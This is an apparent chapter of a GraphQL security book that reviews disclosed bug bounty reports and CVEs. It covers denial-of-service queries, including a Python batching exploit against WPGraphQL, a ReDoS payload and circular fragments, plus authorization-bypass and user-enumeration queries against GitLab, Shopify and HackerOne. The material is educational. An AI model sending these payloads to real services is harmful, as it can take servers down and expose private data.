<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 10: Disclosed Vulnerabilities and Exploits</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:c77cce49-9403-4fd1-99ba-33d115574b0c" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_247" title="247"/><a class="XrefDestination" id="10"/><span class="XrefDestination" id="xref-502840c10-001"/>10</span><br/>
<span class="ChapterTitle"><a class="XrefDestination" id="disclosedvulnerabilitiesandexploits"/><span class="XrefDestination" id="xref-502840c10-002"/>Disclosed Vulnerabilities and Exploits</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">This chapter is dedicated to exploring real-world hacking reports. These previously discovered GraphQL vulnerabilities and exploits will reinforce some of this book’s lessons and hopefully inspire you to conduct your own security research.</p>
<p>Throughout the book, you’ve learned about many approaches to testing GraphQL APIs in a lab environment. But in real-world scenarios, you might run into vulnerabilities that are unique to the application against which you are performing a test. In this chapter, you will discover how specific some vulnerabilities can be. Whenever you learn a new technology, reviewing publicly available hacking reports has numerous advantages. This chapter will be useful because you’ll discover the following:</p>
<ul class="disc">
<li>New hacking techniques from others in the community</li>
<li>Other hackers’ approaches to the process of publicly disclosing vulnerabilities, including the technical depth of their reports as well as how to <span epub:type="pagebreak" id="Page_248" title="248"/>communicate with external companies, gauge a vulnerability’s severity, and demonstrate its practical business impact</li>
<li>Ways to identify the software weaknesses that companies care the most about</li>
<li>The design and implementation of real-life GraphQL applications, and the types of vulnerabilities that companies deal with on a regular basis in their production environments</li>
<li>Companies’ approaches to vulnerability mitigation, as finding a long-term mitigation strategy for a software security flaw is just as important as knowing how to break software</li>
</ul>
<p>As you’ll see, whenever you learn something new, there’s a good chance someone else has already done work that could give you a head start.</p>
<h2 id="h1-502840c10-0001"><a class="XrefDestination" id="DenialofService"/><span class="XrefDestination" id="xref-502840c10-003"/>Denial of Service</h2>
<p class="BodyFirst">In this section, we’ll review publicly disclosed reports that had DoS impacts on the APIs of numerous companies (some of which may even be familiar to you). Remember from <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span> that DoS vulnerabilities are quite common in GraphQL because of the power of the query language. Let’s explore just how much of an impact these issues can have on a server.</p>
<h3 id="h2-502840c10-0001"><a class="XrefDestination" id="UsingaLargePayload(HackerOne)"/><span class="XrefDestination" id="xref-502840c10-004"/>A Large Payload (HackerOne)</h3>
<p class="BodyFirst">HackerOne’s bug bounty platform uses GraphQL extensively in its production environment. In addition to hosting the bug bounty programs of other companies, it runs its own program, which hackers can use to disclose security issues identified in the platform.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	You can find the HackerOne program at <a class="LinkURL" href="https://hackerone.com/security">https://hackerone.com/security</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>In May 2020, one hacker disclosed such a vulnerability (<a class="LinkURL" href="https://hackerone.com/reports/887321">https://hackerone.com/reports/887321</a>). They identified that, despite the HackerOne documentation indicating the existence of a character limit on the API’s query inputs, this limit wasn’t enforced in practice.</p>
<p>To test the vulnerability, the hacker coded a Python-based exploit (included in the report) that does the following:</p>
<ol class="decimal">
<li value="1">Sets some necessary HTTP request information, such as cookies and authorization headers.</li>
<li value="2">Initializes an empty string variable, <code>a</code>.</li>
<li value="3">Performs a <code>for</code> loop 15,000 times and adds a character string to <code>a</code>, effectively creating a string of 15,000 characters.</li>
<li value="4">Performs another <code>for</code> loop 50 times to send a mutation query that uses the <code>CreateStructuredScope</code> field. This field uses the constructed payload from the previous step 10 times, effectively providing a value to the field’s <code>instruction</code> argument containing 150,000 characters.</li>
<li value="5"><span epub:type="pagebreak" id="Page_249" title="249"/>Outputs the amount of time it takes the server to return a response to a client query. This value is used as an indicator of the query’s possible performance impact on the server. The slower the response time, the more obvious it becomes that server performance degrades.</li>
</ol>
<p>The following is a snippet of the mutation used in the exploit. The large payload constructed by the exploit replaces the <code>$instruction</code> placeholder as part of the mutation:</p>
<pre><code><var>--snip--</var>
mutation ($eligible_for_submission: Boolean, $instruction: String)
{
  createStructuredScope(input: {$eligible_for_submission, instruction: <b>$instruction</b>})
    {
<var>      --snip--</var>
    }
}
<var>--snip--</var></code></pre>
<p>Sending this mutation to the server proved impactful. After the hacker sent a few of these requests, the GraphQL server started running into difficulties, returning the HTTP server errors <em>500 Internal Server Error</em>, <em>502 Bad Gateway</em>, and <em>504</em> <em>Gateway Timeout</em>, effectively causing a DoS. HTTP response codes at the 500 level are server-side errors that indicate something went wrong, either with the proxy or with the server.</p>
<p>Remember that DoS vulnerabilities don’t necessarily need to knock a server completely offline to be effective. They can also consume a lot of resources, causing a visible performance degradation.</p>
<p>HackerOne granted the hacker a bounty of $2,500 for responsibly disclosing this report.</p>
<h3 id="h2-502840c10-0002"><a class="XrefDestination" id="UsingRegularExpressions(CSMoney)"/><span class="XrefDestination" id="xref-502840c10-005"/>Regular Expressions (CS Money)</h3>
<p class="BodyFirst">One form of DoS not covered in <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span> uses regular expressions (regex). <em>Regular expression DoS (ReDoS)</em> exhausts a server by forcing it to process a malicious regex pattern whose evaluation consumes significant time and resources. These vulnerabilities aren’t API specific, although they can exist in all API technologies, including REST, SOAP, and GraphQL.</p>
<p>ReDoS vulnerabilities can happen in various ways:</p>
<ul class="disc">
<li>The client provides a malicious regex pattern as input to the server.</li>
<li>The server contains a regex logic pattern that could result in infinite evaluation when a matching input is provided, and a client provides such an input. If the input is abnormally large, ReDoS could occur.</li>
</ul>
<p>Here is an example of a regex pattern that could be vulnerable to ReDoS: <code>(a+)+</code>. This pattern can match against any string containing any number of the letter <code>a</code>, such as <code>aaaaaaaaaaaaaaaaaaaa</code>. If a client sent a large payload of 100,000 <code>a</code> characters, the server might slow down while the pattern is being evaluated.</p>
<p><span epub:type="pagebreak" id="Page_250" title="250"/>You can use online regex testing websites such as <a class="LinkURL" href="https://regex101.com">https://regex101.com</a> to see how a particular expression behaves in practice, as shown in <a href="#figure10-1" id="figureanchor10-1">Figure 10-1</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c10/f10001.png"/>
<figcaption><p><a id="figure10-1">Figure 10-1</a>: The online regular expression tester at <a class="LinkURL" href="https://regex101.com">https://regex101.com</a></p></figcaption>
</figure>
<p>In October 2020, an ethical hacker who goes by the handle of mvm reported a ReDoS vulnerability in a GraphQL API to CS Money’s bug bounty program (<a class="LinkURL" href="https://hackerone.com/reports/1000567">https://hackerone.com/reports/1000567</a>). The hacker found that the GraphQL <code>search</code> object takes a <code>q</code> (query) argument. In their testing, they inserted a Unicode null value (<code>\u0000</code>) as its value:</p>
<pre><code>query {
  search(q: "<b>\u0000)</b>", lang: "en") {
<var>  --snip--</var>
}</code></pre>
<p>In response to this query, the GraphQL API server returned an interesting error that revealed some information critical to identifying the existence of the ReDoS vulnerability:</p>
<pre><code>"errors": [
    {
      "message": "value (?=.*<b>\u0000</b>) must not contain null bytes"
<var>      --snip--</var>
    }
]</code></pre>
<p>As you can see, the string supplied through the <code>q</code> argument was inserted into regex-matching logic on the server, indicated by the preceding <code>(?=.*</code> string in the response. The server might use this argument to search for relevant data in a database.</p>
<p>Conveniently, the server had query tracing enabled through its extensions. <em>Query tracing</em> allows GraphQL servers to return response metadata useful for debugging and provides information about the query’s performance. The tracing information in the response disclosed three <span epub:type="pagebreak" id="Page_251" title="251"/>informative fields to the client (<code>startTime</code>, <code>endTime</code>, and <code>duration</code>), revealing the amount of time it took the server to process the query:</p>
<pre><code>"extensions": {
    "tracing": {
      "startTime": "02:07:55.251",
      "endTime": "02:07:55.516",
      "duration": 264270190,
<var>       --snip--</var>
    }
}</code></pre>
<p>These fields also go to show how sometimes innocent-looking information can assist us during a penetration test. Always look at the details.</p>
<p>After identifying the potential vulnerability, the hacker then used a malicious regex pattern and set it as the value of the <code>q</code> argument:</p>
<pre><code>query {
  search(q: "<b>[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\</b>", lang: "en"){
<var>    --snip--</var>
 }
}</code></pre>
<p>This pattern will match against any character in the ranges <code>a</code> to <code>z</code>, <code>A</code> to -<code>Z</code>, and <code>0</code> to <code>9</code>.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	To get the full explanation of this pattern, insert it into an online regex evaluator such as <a class="LinkURL" href="https://regex101.com">https://regex101.com</a>, which will provide a detailed explanation of what it does.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>The most important takeaway here is that this pattern would most likely match against many strings in the application’s backend database, causing the server to process (and possibly return) a lot of data. In their report, the hacker shared a proof-of-concept cURL command that uses the GraphQL query. They showed that, by running it 100 times, they were able to completely take down the GraphQL server.</p>
<p>As you can see, malicious payloads can take down servers. We highly discourage sending malicious payloads to a company’s production APIs without an explicit authorization from the company, as they can negatively impact business if the company isn’t equipped to handle malicious payloads.</p>
<p>The company granted a bounty of $250 for this report.</p>
<h3 id="h2-502840c10-0003"><a class="XrefDestination" id="UsingaCircularIntrospectionQuery(GitLab)"/><span class="XrefDestination" id="xref-502840c10-006"/>A Circular Introspection Query (GitLab)</h3>
<p class="BodyFirst">The following vulnerability was reported to GitLab in July 2019 (<a class="LinkURL" href="https://gitlab.com/gitlab-org/gitlab/-/issues/30096">https://gitlab.com/gitlab-org/gitlab/-/issues/30096</a>). This vulnerability abuses the circular relationship between the <code>type</code> and <code>field</code> fields in GraphQL’s introspection query.</p>
<p><span epub:type="pagebreak" id="Page_252" title="252"/>The reporter, who goes by the handle freddd, identified that it was possible to trigger a DoS condition by using the <code>__schema</code> meta-field to call <code>types</code>, followed by a recursive call to <code>fields</code> and <code>type</code>:</p>
<pre><code>query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
<var>              --snip--</var>
            }
          }
        }
      }
    }
  }
}</code></pre>
<p>This query relies on introspection being enabled on the API. When introspection is disabled, it’s typically not possible to call the <code>__schema</code> meta-field directly.</p>
<p>Although GitLab had implemented query complexity checks to mitigate circular query-based DoS attacks, the control didn’t apply to the introspection query, effectively leaving it unintentionally vulnerable.</p>
<p>Exploiting this vulnerability also didn’t require the hacker to be authenticated to the GraphQL API. The absence of authentication makes it more severe, as it lowers the barrier to entry when it comes to who can exploit it.</p>
<h3 id="h2-502840c10-0004"><a class="XrefDestination" id="UsingAliasesforFieldDuplication(Magento)"/><span class="XrefDestination" id="xref-502840c10-007"/>Aliases for Field Duplication (Magento)</h3>
<p class="BodyFirst">Magento, one of the most popular ecommerce platforms on the internet, uses GraphQL, and in April 2021, the platform was impacted by a DoS vulnerability. Using field duplication, an attacker could exhaust server resources without being authenticated. (Magento allows unauthenticated clients to use certain GraphQL objects and requires a valid, authenticated session for others.)</p>
<p>We, the authors of this book, identified that Magento did not protect itself against malicious queries that repeated fields many times. We used the following query as a proof of concept:</p>
<pre><code>query {
  alias1: countries {
     full_name_english
     full_name_english # continues 1000s of times
<var>     --snip--</var>
  }
  alias2: countries {
<var>     --snip--</var>
  }
<span epub:type="pagebreak" id="Page_253" title="253"/>  alias3: countries {
<var>     --snip--</var>
  }
}</code></pre>
<p>This query used GraphQL aliases as a way to batch repeat queries in a single HTTP request, a technique that allowed the attacker to send the server very complex queries. It effectively exhausted the server’s resources because of the absence of security controls, such as query cost limits.</p>
<p>Magento has since introduced many GraphQL security features into its platform, such as GraphQL query complexity limits and query depth analysis. <a href="#figure10-2" id="figureanchor10-2">Figure 10-2</a> shows the default values for the security controls Magento implemented in its API.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c10/f10002.png"/>
<figcaption><p><a id="figure10-2">Figure 10-2</a>: Magento’s default values for query complexity and query depth controls</p></figcaption>
</figure>
<p>As you can see, Magento has implemented a <code>queryComplexity</code> value of <code>300</code> and a <code>queryDepth</code> value of <code>20</code>, which means that a query cannot exceed a complexity level beyond 300, and a circular query cannot exceed 20 levels of nesting.</p>
<h3 id="h2-502840c10-0005"><a class="XrefDestination" id="UsingArray-BasedBatchingforFieldDuplication(WPGraphQL)"/><span class="XrefDestination" id="xref-502840c10-008"/>Array-Based Batching for Field Duplication (WPGraphQL)</h3>
<p class="BodyFirst">This vulnerability is quite similar to the previous field duplication vulnerability we discussed. In April 2021, WPGraphQL, a GraphQL plug-in for WordPress (<a class="LinkURL" href="https://www.wpgraphql.com">https://www.wpgraphql.com</a>), suffered a DoS vulnerability due to a lack of proper security controls and an insecure default configuration.</p>
<p>The WPGraphQL plug-in provides a production-ready GraphQL API for any WordPress content management system and is available through the WordPress plug-in marketplace. <a href="#figure10-3" id="figureanchor10-3">Figure 10-3</a> shows this plug-in.</p>
<p>By default, WPGraphQL effectively made any WordPress instance with the plug-in vulnerable to DoS. First, it allowed clients to use array-based batching to batch multiple queries in a single request. In addition, the plug-in had limited security controls in place to protect against malicious queries. Third, because WordPress is a blogging platform that often serves unauthenticated clients (for example, blog readers), certain sections of the API’s functionalities were accessible without special permissions.</p>
<span epub:type="pagebreak" id="Page_254" title="254"/><figure>
<img alt="" class="keyline" src="image_fi/502840c10/f10003.png"/>
<figcaption><p><a id="figure10-3">Figure 10-3</a>: The WPGraphQL plug-in for WordPress</p></figcaption>
</figure>
<p>We found this vulnerability ourselves and published the following exploit code:</p>
<pre><code><var>--snip--</var>
FORCE_MULTIPLIER = int(sys.argv[2])
CHAINED_REQUESTS = int(sys.argv[3])

<var>--snip--</var>
queries = []

payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}

for _ in range(0, CHAINED_REQUESTS):
  queries.append(query)

r = requests.post(WORDPRESS_URL, json=queries)
print('Time took: {}'.format(r.elapsed.total_seconds()))</code></pre>
<p>This code sets two variables that essentially define the complexity of a single HTTP request: <code>FORCE_MULTIPLIER</code> is an integer variable that duplicates a selection set of fields, and <code>CHAINED_REQUESTS</code> holds the number of elements the exploit will add into the batched array.</p>
<p>Next, a <code>queries</code> variable is set to an empty array. This variable will hold the full malicious payload that will eventually be sent to WPGraphQL. The code then creates a special query that will be duplicated by the integer value assigned to the <code>FORCE_MULTIPLIER</code> variable and crafts this into a query JSON object for the HTTP request. Next, a loop runs <em>N</em> number of times, where <em>N</em> is the value of <code>CHAINED_REQUESTS</code>. If <code>CHAINED_REQUESTS</code> is set to <code>100</code>, the loop will run 100 times and create an array containing 100 elements. Lastly, <span epub:type="pagebreak" id="Page_255" title="255"/>the exploit sends the HTTP request and calculates how long it takes the server to respond to the expensive query.</p>
<p>In short, if both <code>FORCE_MULTIPLIER</code> and <code>CHAINED_REQUESTS</code> are set to <code>100</code>, the final array will include 100 queries that each contain 100 duplicated fields. Imagine how expensive such a query might be to process if these two variables were set to 10,000.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Since the disclosure, WPGraphQL has made significant security improvements to the plug-in and has addressed this DoS vulnerability.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-502840c10-0006"><a class="XrefDestination" id="UsingCircularFragments(Agoo)"/><span class="XrefDestination" id="xref-502840c10-009"/>Circular Fragments (Agoo)</h3>
<p class="BodyFirst">We discovered a circular fragment vulnerability in May 2022 in a Ruby-based GraphQL server implementation named <em>Agoo</em>. Identified by CVE-2022-30288, the vulnerability stems from the absence of validations checks on incoming queries at the Agoo server level. This failure to validate means the server isn’t spec compliant. It also means that queries sent to an Agoo server can take it down in several ways. Let’s explore how we were able to do this with circular fragments.</p>
<p>As a first step, we wanted to check whether introspection was enabled by default, so we ran the following query:</p>
<pre><code>query Introspection {
  __schema {
    directives {
      name
    }
  }
}</code></pre>
<p>This query is simple; it returns the name of all the directives in the schema. This is a pretty good query to use when you don’t yet know what operations the GraphQL server supports.</p>
<p>Next, we built a circular query using fragments that reference the query:</p>
<pre><code>query CircularFragment {
  __schema {
<span aria-label="annotation1" class="CodeAnnotationCode">❶</span> ...A
  }
}

fragment A on __Schema {
  directives {
    name
  }
<span aria-label="annotation2" class="CodeAnnotationCode">❷</span> ...B
}

fragment B on __Schema {
<span aria-label="annotation3" class="CodeAnnotationCode">❸</span> ...A
}</code></pre>
<p><span epub:type="pagebreak" id="Page_256" title="256"/>We created two fragments on the <code>__Schema</code> type. The first fragment <code>A</code> uses the <code>directives</code> top-level field with the <code>name</code> field. It then calls (or imports) fragment <code>B</code> at <span aria-label="annotation2" class="CodeAnnotation">❷</span>. Fragment <code>B</code> contains <code>...A</code> at <span aria-label="annotation3" class="CodeAnnotation">❸</span>, which calls fragment <code>A</code> again. At this point, we have two circular fragments. Now, to get them executed, we need to use either of them inside a query. At <span aria-label="annotation1" class="CodeAnnotation">❶</span>, you can see how we use fragment <code>A</code> by calling <code>...A</code> inside the <code>__schema</code> meta-field.</p>
<p>At this point, the cyclical condition starts, and never ends! Running this query against Agoo will freeze the server, and it will no longer be able to serve queries. The only way to recover it is by restarting Agoo’s server process.</p>
<p>Some of these DoS vulnerabilities were found in big-name products that have been using GraphQL for quite some time, proving that no one is immune to vulnerabilities.</p>
<h2 id="h1-502840c10-0002"><a class="XrefDestination" id="BrokenAuthorization"/><span class="XrefDestination" id="xref-502840c10-010"/>Broken Authorization</h2>
<p class="BodyFirst">In this section, we’ll explore vulnerabilities that impacted authorization controls in GraphQL APIs. These types of issues can eventually lead to data disclosure and allow unauthorized access to sensitive information.</p>
<h3 id="h2-502840c10-0007"><a class="XrefDestination" id="AllowingDataAccesstoDeactivatedUsers(GitLab)"/><span class="XrefDestination" id="xref-502840c10-011"/>Allowing Data Access to Deactivated Users (GitLab)</h3>
<p class="BodyFirst">In a publicly disclosed vulnerability reported to GitLab in August 2021, a hacker who goes by the handle Joaxcar was able to access data by using a deactivated user account to authenticate to the GraphQL API and perform actions that shouldn’t have been allowed (<a class="LinkURL" href="https://hackerone.com/reports/1192460">https://hackerone.com/reports/1192460</a>).</p>
<p>Deactivated user accounts should have their access denied until they are reactivated by the application’s maintainer. While the user is deactivated, the application should reject the user’s access attempts, whether directly through the console or through API keys, even if they have active API keys.</p>
<p>To understand the risk this poses, imagine that an employee goes on vacation and that the security team’s policy is to disable all employee accounts until they return to the office. Now imagine that the employee’s password was leaked to the internet, and a threat actor is in possession of these credentials. In the vulnerability scenario we’re describing here, the threat actor would be able to call the application even though the user’s account is disabled. This shouldn’t happen with proper authentication and authorization controls.</p>
<p>Here is what Joaxcar did to exploit the vulnerability:</p>
<ol class="decimal">
<li value="1">As an administrator, created a secondary user with an API key</li>
<li value="2">Still as an administrator, disabled the newly created user</li>
<li value="3">Used the deactivated user’s API key to call the GraphQL API</li>
<li value="4">Confirmed that they were successfully able to perform actions with the deactivated user credentials</li>
</ol>
<p><span epub:type="pagebreak" id="Page_257" title="257"/>They used the following GraphQL query as part of the test:</p>
<pre><code>mutation {
    labelCreate(input:{title:"deactivated", projectPath:"test1/test1"}){
        errors
        label {
            id
        }
    }
}</code></pre>
<p>The query uses the <code>labelCreate</code> object with an input type argument that accepts a <code>title</code> and a <code>projectPath</code>. In other words, the vulnerability allowed the ethical hacker to use a deactivated account to create a label field. It’s quite possible that the vulnerability would have allowed other actions too, other than label creation.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	The API token used in the exploit (not shown in the code snippet) was passed as a Bearer token to the <code>Authorization</code> HTTP header.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-502840c10-0008"><a class="XrefDestination" id="AllowinganUnprivilegedStaffMembertoModifyaCustomer’sEmail(Shopify)"/><span class="XrefDestination" id="xref-502840c10-012"/>Allowing an Unprivileged Staff Member to Modify a Customer’s Email (Shopify)</h3>
<p class="BodyFirst">The following vulnerability was reported to the Shopify bug bounty program by user ash_nz in September 2021 (<a class="LinkURL" href="https://hackerone.com/reports/980511">https://hackerone.com/reports/980511</a>). An e-commerce company, Shopify has been a trailblazer in the GraphQL space for many years, developing useful open source tools, publishing articles about GraphQL best practices, and more.</p>
<p>The vulnerability allowed ash_nz to modify a customer email by using an unprivileged shop staff account, which could update email objects through a dedicated GraphQL API mutation. Here is the mutation as seen in the report:</p>
<pre><code>mutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!) {
    emailSenderConfigurationUpdate(input:$input) {
        emailSenderConfiguration {
            id
        }
        userErrors {
            field
            message
        }
    }
 }</code></pre>
<p>The hacker passed a customer’s email to the mutation’s <code>input</code> parameter and sent it to the GraphQL API server, which updated the customer’s email, despite the API caller not having the right privileges to do so.</p>
<p>This is a fairly simple vulnerability, but identifying it does require testing multiple hypotheses and edge cases. Always evaluate APIs using various <span epub:type="pagebreak" id="Page_258" title="258"/>privilege levels and attempt cross-account or cross-user access to uncover authorization issues.</p>
<p>The hacker received a bounty of $1,500 from Shopify for responsibly disclosing this issue.</p>
<h3 id="h2-502840c10-0009"><a class="XrefDestination" id="DisclosingtheNumberofAllowedHackersThroughaTeamObject(HackerOne)"/><span class="XrefDestination" id="xref-502840c10-013"/>Disclosing the Number of Allowed Hackers Through a Team Object (HackerOne)</h3>
<p class="BodyFirst">In April 2018, an ethical hacker with the handle haxta4ok00 identified a GraphQL authorization issue in HackerOne that led to an information disclosure vulnerability (<a class="LinkURL" href="https://hackerone.com/reports/342978">https://hackerone.com/reports/342978</a>).</p>
<p>The hacker identified that, by making a query that uses the <code>team</code> object in HackerOne’s GraphQL API, they could access a restricted field that they otherwise shouldn’t have been able to access. The <code>team</code> object allowed querying for programs on the HackerOne platform and returning information such as their <code>id</code> and <code>name</code>.</p>
<p>The hacker also identified that when the <code>whitelisted_hackers</code> field is specified, it returns the <code>total_count</code> of the program’s number of allowed hackers. Since the team object takes an argument of <code>handle</code>, it practically allows searching for programs based on their <code>handle</code> string. In the following example, the handle is <code>security</code>:</p>
<pre><code>query {
    team(handle:"security"){
        id
        name
        handle
        whitelisted_hackers {
            total_count
        }
    }
}</code></pre>
<p>The HackerOne triage team was able to determine that this vulnerability could have also allowed someone to identify other non-public programs on the platform by supplying various strings to the <code>handle</code> argument that might match a team’s handle. The response to the query is as follows:</p>
<pre><code><var>--snip--</var>
"team":{
    "id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=",
    "name":"HackerOne",
    "handle":"security",
    "whitelisted_hackers":{
        <b>"total_count":30</b>
    }
}
<var>--snip--</var></code></pre>
<p><span epub:type="pagebreak" id="Page_259" title="259"/>As you can see, the disclosed information isn’t very sensitive in nature, but it can be used to infer whether the program is private and, therefore, find HackerOne’s customers.</p>
<p>HackerOne paid a bounty of $2,500 for this authorization issue because of the information disclosure impact.</p>
<h3 id="h2-502840c10-0010"><a class="XrefDestination" id="ReadingPrivateNotes(GitLab)"/><span class="XrefDestination" id="xref-502840c10-014"/>Reading Private Notes (GitLab)</h3>
<p class="BodyFirst">Issues created on GitLab may include private notes that only members should be able to view. In June 2019, an ethical hacker with the handle ngalog reported CVE-2019-15576 through a HackerOne report (<a class="LinkURL" href="https://hackerone.com/reports/633001">https://hackerone.com/reports/633001</a>), which showed that hackers can read these notes through GitLab’s GraphQL API despite them being properly restricted in the REST API.</p>
<p>Notes can be sensitive, as they may contain information about duplicate issues, issues moved to another project, or even project code. The ethical hacker used the following query to exploit the vulnerability:</p>
<pre><code>query {
  project(fullPath:"username16/ci-test"){
    issue(iid:"1"){
      descriptionHtml
      notes {
        edges {
          node {
            bodyHtml
            system
            author {
              username
            }
            body
          }
        }
      }
    }
   }
  }</code></pre>
<p>As you can see, the <code>issue</code> object is being used in conjunction with the <code>notes</code> field. This <code>notes</code> field allows access to other fields, such as the note’s <code>body</code>, the note’s <code>author</code>, and more. The screenshot in <a href="#figure10-4" id="figureanchor10-4">Figure 10-4</a>, taken from GitLab GraphQL API documentation, shows the complete list of available fields.</p>
<span epub:type="pagebreak" id="Page_260" title="260"/><figure>
<img alt="" class="keyline" src="image_fi/502840c10/f10004.png"/>
<figcaption><p><a id="figure10-4">Figure 10-4</a>: GitLab’s documentation for the note fields</p></figcaption>
</figure>
<p>The full GitLab GraphQL API documentation can be found at <a class="LinkURL" href="https://docs.gitlab.com/ee/api/graphql/reference">https://docs.gitlab.com/ee/api/graphql/reference</a>.</p>
<h3 id="h2-502840c10-0011"><a class="XrefDestination" id="DisclosingPaymentTransactionInformation(HackerOne)"/><span class="XrefDestination" id="xref-502840c10-015"/>Disclosing Payment Transaction Information (HackerOne)</h3>
<p class="BodyFirst">The following vulnerability, reported to HackerOne in October 2019, impacted its own GraphQL API (<a class="LinkURL" href="https://hackerone.com/reports/707433">https://hackerone.com/reports/707433</a>). It allowed msdian7, the hacker who found and disclosed the issue, to access the total number of payment transactions—information meant to be confidential and accessible by only authorized parties.</p>
<p>The GraphQL query used can be seen here:</p>
<pre><code>query ($handle_0: String!, $size_1: ProfilePictureSizes!) {
  team(handle: $handle_0) {
    id
    name
    about
    profile_picture(size: $size_1)
    offers_swag
    offers_bounties
    base_bounty
    <b>payment_transactions</b> {
      <b>total_count</b>
    }
   }
  }
}</code></pre>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	The original query in the report used GraphQL fragments. For the sake of brevity, we merged the fragments with the query.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Payment data should never be public information. This vulnerability allowed access to the <code>total_count</code> field through the <code>payment_transactions</code> field by using an unauthorized session, effectively providing insight into the transactions made by other bug bounty programs on the HackerOne platform.</p>
<h2 id="h1-502840c10-0003"><span epub:type="pagebreak" id="Page_261" title="261"/><a class="XrefDestination" id="InformationDisclosure"/><span class="XrefDestination" id="xref-502840c10-016"/>Information Disclosure</h2>
<p class="BodyFirst">In this section, we will review publicly disclosed vulnerabilities that led exclusively to information disclosure issues. Some of the issues we covered earlier in this chapter also resulted in information disclosure outcomes, though these stemmed from other vulnerabilities such as broken access control mechanisms.</p>
<h3 id="h2-502840c10-0012"><a class="XrefDestination" id="EnumeratingGraphQLUsers(GitLab)"/><span class="XrefDestination" id="xref-502840c10-017"/>Enumerating GraphQL Users (GitLab)</h3>
<p class="BodyFirst">In 2021, Rapid7 identified CVE-2021-4191 in GitLab’s Community Edition and Enterprise Edition. The vulnerability allowed unauthenticated attackers to access user information in private GitLab instances that had specifically restricted their user registration interfaces through the <code>users</code> field.</p>
<p>For example, the following query returns information about users in GitLab instances, such as their name, username, and ID:</p>
<pre><code>query {
  users {
    nodes {
      id
      name
      username
    }
  }
}</code></pre>
<p>In addition to a user’s name and username, the vulnerability affected fields such as their email, location, user permissions, group memberships, state, and profile picture. Having access to so much information about users is useful for several reasons:</p>
<ul class="disc">
<li><b>Identifying accounts to attack.</b> Knowledge of usernames and emails allowed threat actors to target specific accounts. Having access to user emails also allowed threat actors to pivot to other attacks, such as social engineering, by sending phishing emails to users.</li>
<li><b>Identifying available groups.</b> The vulnerability allowed attackers to infer information about the company running GitLab through their group memberships. Group memberships can reveal information such as acquisitions, subsidiaries, other company branches, regions where the company operates, and so on.</li>
<li><b>Identifying individuals.</b> The vulnerability allowed access to profile pictures, which could help threat actors target specific users on platforms outside of GitLab.</li>
<li><b>Identifying state of accounts.</b> Knowing the state of an account (whether it’s disabled or enabled) could make attacks such as brute forcing more effective; threat actors could target only accounts that are in an enabled state, allowing them to optimize their attacks.</li>
</ul>
<p><span epub:type="pagebreak" id="Page_262" title="262"/>This vulnerability is especially interesting because of how simple and straightforward it is to exploit. The fact that it can be done in an unauthenticated manner increases its severity quite a lot too.</p>
<h3 id="h2-502840c10-0013"><a class="XrefDestination" id="AccessingtheIntrospectionQueryviaWebSocket(Nuri)"/><span class="XrefDestination" id="xref-502840c10-018"/>Accessing the Introspection Query via WebSocket (Nuri)</h3>
<p class="BodyFirst">This report is an interesting one and quite unique. In April 2020, an ethical hacker who goes by the handle zerodivisi0n disclosed a vulnerability in Nuri’s API that caused schema information to leak through an introspection query (<a class="LinkURL" href="https://hackerone.com/reports/862835">https://hackerone.com/reports/862835</a>). This GraphQL API used WebSocket as its transport protocol, not HTTP.</p>
<p>In earlier chapters, you learned about GraphQL and WebSocket in the context of subscription operations; clients can subscribe to certain events of interest to get real-time information over the WebSocket protocol. Certain GraphQL libraries, such as <em>graphql-ws</em> (<a class="LinkURL" href="https://github.com/enisdenjo/graphql-ws">https://github.com/enisdenjo/graphql-ws</a>), allow not only subscriptions to be sent over WebSocket but also queries and mutations.</p>
<p>The reported vulnerability enabled hackers to execute the introspection query directly via a WebSocket connection. While the report doesn’t include a whole lot of details about how the GraphQL implementation was designed to work, introspection was disabled on interfaces that aren’t WebSocket based, such as in query operations sent over HTTP.</p>
<p>An introspection query over a WebSocket client-to-server message could look like the following:</p>
<pre><code>{"type":"start","payload":{"query":"query Introspection { __schema {...} }"}}</code></pre>
<p>Query and mutation operations sent over WebSocket aren’t currently very common. You’re more likely to see GraphQL subscription operations transported over WebSocket, but this could change over time as GraphQL trends evolve.</p>
<h2 id="h1-502840c10-0004"><a class="XrefDestination" id="Injection"/><span class="XrefDestination" id="xref-502840c10-019"/>Injection</h2>
